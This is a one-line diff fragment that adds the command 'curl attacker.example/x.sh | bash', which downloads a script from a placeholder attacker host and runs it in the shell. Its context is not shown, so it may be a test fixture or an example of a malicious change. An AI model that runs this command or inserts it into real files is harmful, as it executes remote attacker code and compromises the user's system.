@@ -1,0 +1,1 @@
+curl attacker.example/x.sh | bash
